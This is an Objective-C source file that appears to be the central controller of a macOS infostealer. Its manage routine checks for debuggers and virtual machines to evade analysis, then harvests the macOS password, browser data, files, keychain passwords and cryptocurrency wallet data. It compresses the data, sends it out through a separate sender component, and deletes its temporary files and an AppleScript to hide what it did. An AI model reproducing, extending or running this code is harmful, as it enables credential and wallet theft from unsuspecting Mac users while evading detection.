#ifdef DEBUG
#define DebugLog(...) NSLog(__VA_ARGS__)
#else
#define DebugLog(...) (void)0
#endif


#import "Controller.h"
#import "Tools.h"
#import "AntiVM.h"
#import "System.h"
#import "Browsers.h"
#import "Sender.h"
#import "Wallets.h"
#import "globals.h"

@implementation Controller

- (instancetype)initWithEncryptionKey:(NSString *)encryptionKey {
    self = [super init];
    if (self) {
        _encryptionKey = encryptionKey;
        _system = [[System alloc] initWithEncryptionKey:encryptionKey];
        _tools = [Tools new];
        _antivm = [AntiVM new];
        _browsers = [Browsers new];
        _sender = [Sender new];
        _wallets = [Wallets new];
    }
    return self;
}

- (void)manage {
    if ([AntiVM isDebuggerAttached]) {
        return;
    }

    if ([AntiVM checkVM]) {
        return;
    }


    [Tools initializeGlobalTmpPath];
    [_system getMacOSPassword];


    [_browsers collectAllData];

    [_system collectSystemInfo];

    [_system fileGrab];

    [_system dumpKeychainPasswords];

    [_wallets collectWalletData];

    [Tools compressFolder:TEMPORARY_PATH];

    [_sender sendData];

    [Tools removeItemAtPath:TEMPORARY_PATH];

    NSString *appleScriptPath = @"/tmp/tempAppleScript.scpt";
    [Tools removeItemAtPath:appleScriptPath];

    NSString *sourceTempPath = [[Tools getHomeDirectory] stringByAppendingPathComponent:@"tempFolder-32555443"];

    [Tools removeItemAtPath:sourceTempPath];

}

@end
